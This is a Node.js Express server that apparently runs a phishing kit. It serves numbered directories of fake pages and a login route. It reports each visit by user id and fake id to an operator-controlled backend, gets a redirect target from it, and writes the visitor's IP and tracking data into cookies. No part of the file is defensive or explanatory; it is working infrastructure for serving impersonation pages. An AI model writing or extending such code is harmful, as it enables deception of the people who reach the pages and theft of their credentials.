require('dotenv').config()
const express = require("express")
const cors = require('cors')
const cookieParser = require('cookie-parser')
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args))
const fs = require('fs')
const path = require('path')

const app = express()

//Enable cors (maybe it will help, as block for safe browser's api)
// app.use(cors({origin: process.env.SUB_SERVER_URL, methods: ['POST', 'GET']}))

//Enable read/write cookies
app.use(cookieParser())

// app.set('trust proxy', true)
app.use(express.json({extended: true}))
app.use('/login', require('./auth/login'))
app.use(express.static(path.resolve('./auth')))

//You must add or remove this strings (how many fakes there are so many strings)
app.use(express.static(path.resolve(__dirname + '/0')))
app.use(express.static(path.resolve(__dirname + '/1')))
app.use(express.static(path.resolve(__dirname + '/2')))
app.use(express.static(path.resolve(__dirname + '/3')))
app.use(express.static(path.resolve(__dirname + '/4')))
app.use(express.static(path.resolve(__dirname + '/5')))
app.use(express.static(path.resolve(__dirname + '/6')))
app.use(express.static(path.resolve(__dirname + '/7')))
app.use(express.static(path.resolve(__dirname + '/8')))
app.use(express.static(path.resolve(__dirname + '/9')))
app.use(express.static(path.resolve(__dirname + '/10')))
app.use(express.static(path.resolve(__dirname + '/11')))
app.use(express.static(path.resolve(__dirname + '/12')))
app.use(express.static(path.resolve(__dirname + '/13')))
app.use(express.static(path.resolve(__dirname + '/14')))
app.use(express.static(path.resolve(__dirname + '/15')))
app.use(express.static(path.resolve(__dirname + '/16')))
app.use(express.static(path.resolve(__dirname + '/17')))
app.use(express.static(path.resolve(__dirname + '/18')))
app.use(express.static(path.resolve(__dirname + '/19')))
app.use(express.static(path.resolve(__dirname + '/20')))


app.get(/(^\/[a-zA-Z0-9]{6,10})/, async (request, response) => {
    if(Object.keys(request.query)[0]!== undefined){
        fs.readdir(path.resolve(__dirname, Object.keys(request.query)[0]), async (err, files)=>{
            let user_id = request.params[0].substring(1, request.params[0].length)
            let fake_id = Object.keys(request.query)[0]
            if(err){
                return response.end('404 server not found')
            }else{
                await fetch(process.env.SUB_SERVER_URL+'/api/update_link_data',{
                    method: 'POST',
                    headers:{
                        'Content-type': 'application/json'
                    },
                    body:   JSON.stringify({
                        id: user_id,
                        fake_id: fake_id,
                        url: 'https://reallyLongLinkTESTTESTTEST.com/'
                        //new URL(request.protocol+'://'+request.hostname).origin
                    })
                })
                let res = await fetch(process.env.SUB_SERVER_URL+'/api/get_redirect',{
                    method: 'POST',
                    headers:{
                        'Content-type': 'application/json'
                    },
                    body:   JSON.stringify({
                        id: user_id,
                        fake_id: fake_id,
                        url: 'https://reallyLongLinkTESTTESTTEST.com/'
                        //new URL(request.protocol+'://'+request.hostname).origin
                    })
                })

                let redirect = {redirect:'https://google.com/404', validator: true}
                try{
                    redirect = await res.json()
                }catch (e){
                    console.log(e.message)
                }

                //Set cookies
                response.cookie('fake_url', new URL(request.protocol+'://'+request.hostname).origin)
                response.cookie('has_validator', redirect.validator)
                response.cookie('id', user_id)
                response.cookie('ip', request.ip)
                response.cookie('fake_id', fake_id)
                response.cookie('redirect', redirect.redirect)
                response.cookie('type', process.env.SERVER_TYPE)

                //Find .html/.htm main fake's file
                let filetered_files = files.filter(file=>file.includes('.')&&(file.split('.')[1]==='html'))
                if(filetered_files.length < 1){
                    return response.end('Server error')
                    // response.redirect((new URL(request.protocol+'//'+request.hostname).origin)+'/'+user_id+'?'+(fake_id-1))
                }else{
                    return response.sendFile(path.join(__dirname, fake_id, '/', filetered_files[filetered_files.length-1]))
                }
            }
        })
    }else{
        return response.send('404 server not found')
    }
})

app.listen(9999, ()=>{
    console.log('FAKE SECCUSSFULLY STARTED')
})